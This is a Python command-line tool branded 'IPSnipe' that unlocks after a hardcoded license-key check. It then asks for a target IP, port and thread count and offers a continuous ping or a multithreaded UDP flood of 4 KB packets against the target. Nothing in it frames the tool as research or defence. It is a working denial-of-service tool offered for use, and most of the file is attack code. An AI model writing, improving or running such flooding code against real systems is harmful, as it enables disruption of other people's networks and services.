﻿import time
import os
import sys
import socket
import threading
import subprocess

# ANSI escape codes for colors
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    BLUE = '\033[94m'
    RESET = '\033[0m'

# Function to clear screen
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# Print the initial text
def print_initial_text():
    sys.stdout.write(f"{Colors.RED}█████ ████  █████ █   █ █████ ████  █████ \n")
    sys.stdout.write(f"  █   █   █ █     ██  █   █   █   █ █     \n")
    sys.stdout.write(f"  █   ████  █████ █ █ █   █   ████  ████  \n")
    sys.stdout.write(f"  █   █         █ █  ██   █   █     █     \n")
    sys.stdout.write(f"█████ █     █████ █   █ █████ █     █████{Colors.RESET}\n")
    sys.stdout.write(f"\nEnter your IPSnipe license key:{Colors.RESET}\n")

# Function to check license key
def check_license_key(key):
    valid_keys = {"22AW-JT12-NNAS", "2407HELLCAT", "3EQ-MDFZ-MSQ1"}
    return key in valid_keys

# Function to send a high volume of packets to target IP
def send_traffic(ip, port, stop_event):
    try:
        # Create a UDP socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        packet_size = 4096  # Size of each packet in bytes (4 KB)
        message = b'\x00' * packet_size  # Create a packet of 4 KB
        
        sys.stdout.write(f"{Colors.RED}Sending high volume packets to {ip}:{port}...{Colors.RESET}\n")
        
        while not stop_event.is_set():
            # Send packets at high rate
            for _ in range(500):  # Adjust number of packets per iteration
                sock.sendto(message, (ip, int(port)))
            
            # Optional: Reduce the sleep time for higher throughput
            time.sleep(0.1)
        
        sys.stdout.write(f"{Colors.RED}Stopped sending packets.{Colors.RESET}\n")
    except Exception as e:
        sys.stdout.write(f"{Colors.RED}Error: {e}{Colors.RESET}\n")
    finally:
        sock.close()

# Function to continuously ping the target IP
def ping_target(ip, stop_event):
    try:
        sys.stdout.write(f"{Colors.RED}Pinging {ip}...{Colors.RESET}\n")
        while not stop_event.is_set():
            # Use subprocess to call the ping command
            if os.name == 'nt':  # Windows
                subprocess.run(["ping", ip, "-t"], check=True)
            else:  # Unix-like (Linux, macOS)
                subprocess.run(["ping", ip, "-c", "1"], check=True)
            time.sleep(1)  # Delay between pings
    except Exception as e:
        sys.stdout.write(f"{Colors.RED}Error: {e}{Colors.RESET}\n")

# Main logic
def main():
    while True:
        clear_screen()
        print_initial_text()
        
        # Get license key input
        key = input(f"{Colors.RED}\nLicense Key: {Colors.RESET}").strip()
        
        if check_license_key(key):
            sys.stdout.write(f"{Colors.BLUE}Checking key...{Colors.RESET}\n")
            time.sleep(2)
            clear_screen()
            sys.stdout.write(f"{Colors.GREEN}Unlocked!{Colors.RESET}\n")
            break
        else:
            sys.stdout.write(f"{Colors.RED}Invalid key. Please try again.{Colors.RESET}\n")

    while True:
        # Prompt for target IP
        sys.stdout.write(f"{Colors.RED}Input Target IP:{Colors.RESET}\n")
        target_ip = input().strip()
        
        # Prompt for target port
        sys.stdout.write(f"{Colors.RED}Input Target Port:{Colors.RESET}\n")
        target_port = input().strip()
        
        # Prompt for number of threads
        sys.stdout.write(f"{Colors.RED}Input Number of Threads:{Colors.RESET}\n")
        num_threads = int(input().strip())
        
        # Choose action
        sys.stdout.write(f"{Colors.RED}Choose what to do:{Colors.RESET}\n")
        sys.stdout.write(f"{Colors.RED}1) Ping Target{Colors.RESET}\n")
        sys.stdout.write(f"{Colors.RED}2) Send High Volume Traffic{Colors.RESET}\n")
        sys.stdout.write(f"{Colors.RED}3) Snipe Target{Colors.RESET}\n")
        
        choice = input().strip()
        
        if choice == '1':
            stop_event = threading.Event()
            ping_thread = threading.Thread(target=ping_target, args=(target_ip, stop_event))
            ping_thread.start()
            input(f"{Colors.RED}Press Enter to stop pinging...{Colors.RESET}")
            stop_event.set()
            ping_thread.join()
            break
        elif choice == '2':
            stop_event = threading.Event()
            threads = []
            
            for _ in range(num_threads):
                thread = threading.Thread(target=send_traffic, args=(target_ip, target_port, stop_event))
                thread.start()
                threads.append(thread)
            
            input(f"{Colors.RED}Press Enter to stop sending packets...{Colors.RESET}")
            stop_event.set()
            
            for thread in threads:
                thread.join()
            
            break
        elif choice == '3':
            sys.stdout.write(f"{Colors.RED}Snipe Target functionality is not implemented.{Colors.RESET}\n")
            break
        else:
            sys.stdout.write(f"{Colors.RED}Invalid choice. Please try again.{Colors.RESET}\n")

if __name__ == "__main__":
    main()
